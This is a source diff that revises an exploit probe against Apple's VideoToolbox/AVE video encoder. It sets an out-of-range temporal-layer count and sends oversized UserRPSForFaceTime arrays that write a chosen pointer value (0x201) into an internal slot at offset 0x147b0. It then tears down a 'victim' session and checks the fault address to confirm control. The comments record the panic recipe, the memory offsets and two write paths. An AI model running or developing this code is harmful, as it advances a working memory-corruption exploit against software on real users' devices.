@@ -256,23 +256,37 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     //     ExpectedFrameRate=15, BaseLayerFrameRate=30, NumberOfTemporalLayers=NTL)
     //    so PrepareToEncodeFrames AND EncodeFrame both succeed with st=0 / cb=0
     //    while keeping POST=1 and [+0x2eec] = NTL - 1 unclamped.
-    // P-CONTROL PROBE (marker 0x50505050): the AVE_PSGen fill only reaches slot[0]
-    // at NTL>=16463 (all NTL<16463 survivors prove it), but the RPS parser writes
-    // struct#9 of a 10-dict array straight onto pINS+0x147b0: DeltaPOCS0Minus1[12..15]
-    // cover slot[0]'s 8 bytes. P=0x201 -> teardown x0=P+0x58=0x259, a unique fault.
+    // P-CONTROL PROBE v2 (marker 0x50505050): run the proven-panic shape (NTL=16463,
+    // raw EncoderUsage=1) so teardown is GUARANTEED to fire (fill sets slot[0]=0x1 ->
+    // far=0x59). Then overwrite slot[0] with P=0x201 via two independent paths:
+    //   inner: DeltaPOCS0Minus1[41916..41919] -> strh at +0x38+2*i reaches 0x147b0
+    //   outer: arr10 struct#9 DeltaPOCS0[12..15] -> 0x13adc+9*0x164+0x50 = 0x147b0
+    // far=0x259 => our write won (full P control). far=0x59 => fill won (geometry off).
     if (self.marker == 0x50505050) {
+        NSMutableArray *s0 = [NSMutableArray arrayWithCapacity:41920];
+        for (int e = 0; e < 41920; e++) [s0 addObject:@0];
+        s0[41916] = @0x0201;
+        NSDictionary *bigDict = @{
+            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+            @"NumNegativePics": @16,
+            @"NumPositivePics": @0,
+            @"DeltaPOCS0Minus1": s0,
+            @"UsedByCurrPicS0Flag": @0,
+            @"DeltaPOCS1Minus1": @[],
+            @"UsedByCurrPicS1Flag": @0,
+        };
         NSMutableArray *rps10 = [NSMutableArray arrayWithCapacity:10];
         for (int d = 0; d < 10; d++) {
-            NSMutableArray *s0 = [NSMutableArray arrayWithCapacity:16];
-            for (int e = 0; e < 16; e++) [s0 addObject:@0];
+            NSMutableArray *s0b = [NSMutableArray arrayWithCapacity:16];
+            for (int e = 0; e < 16; e++) [s0b addObject:@0];
             if (d == 9) {
-                s0[12] = @0x0201;
+                s0b[12] = @0x0201;
             }
             [rps10 addObject:@{
                 @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                 @"NumNegativePics": @16,
                 @"NumPositivePics": @0,
-                @"DeltaPOCS0Minus1": s0,
+                @"DeltaPOCS0Minus1": s0b,
                 @"UsedByCurrPicS0Flag": @0,
                 @"DeltaPOCS1Minus1": @[],
                 @"UsedByCurrPicS1Flag": @0,
@@ -290,27 +304,28 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             [report appendString:@"\nVERDICT: PCONTROL_CREATE_FAILED\n"];
             return report;
         }
+        // Panic-shape recipe: raw EncoderUsage=1 + NTL=16463 (no frac pair).
         VTSessionSetProperty(victim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
-        VTSessionSetProperty(victim, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
-        VTSessionSetProperty(victim, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
-        VTSessionSetProperty(victim, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
-        VTSessionSetProperty(victim, CFSTR("BaseLayerFrameRate"), (__bridge CFNumberRef)@30);
-        VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
+        VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
+        OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
         OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
-        [report appendFormat:@"pcontrol victim=%p ntl=%d prep=%d\n", (void *)victim, ntl, (int)vPrep];
+        [report appendFormat:@"pcontrol v2 victim=%p ntl=%d nSet=%d prep=%d (fill set slot[0]=0x1)\n",
+         (void *)victim, ntl, (int)nSt, (int)vPrep];
         CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
         if (pb) {
             VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
             SpriteDrain(victim, vSink, 1, 500);
             CVPixelBufferRelease(pb);
         }
-        OSStatus rpsSt = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps10);
-        [report appendFormat:@"pcontrol arr10 set=%d (struct#9 DeltaPOCS0[12..15] -> slot[0] P=0x201) — teardown x0=0x259\n", (int)rpsSt];
-        [self journal:[NSString stringWithFormat:@"PCONTROL_SET arr10=%d — tearing down for x0=0x259", (int)rpsSt]];
+        OSStatus setInner = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[ bigDict ]);
+        OSStatus setOuter = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps10);
+        [report appendFormat:@"pcontrol set inner(41920)=%d outer(arr10)=%d — teardown: far=0x259 means OUR write, far=0x59 means fill\n",
+         (int)setInner, (int)setOuter];
+        [self journal:[NSString stringWithFormat:@"PCONTROL_V2 inner=%d outer=%d — tearing down NTL=%d", (int)setInner, (int)setOuter, ntl]];
         VTCompressionSessionInvalidate(victim);
         CFRelease(victim);
         CFRelease(retainedVSink);
-        [report appendString:@"pcontrol teardown survived — arr10 did NOT reach slot[0]\n"];
+        [report appendString:@"pcontrol v2 teardown SURVIVED — teardown chain did not fire\n"];
         [report appendString:@"\nVERDICT: PCONTROL_SURVIVED\n"];
         return report;
     }
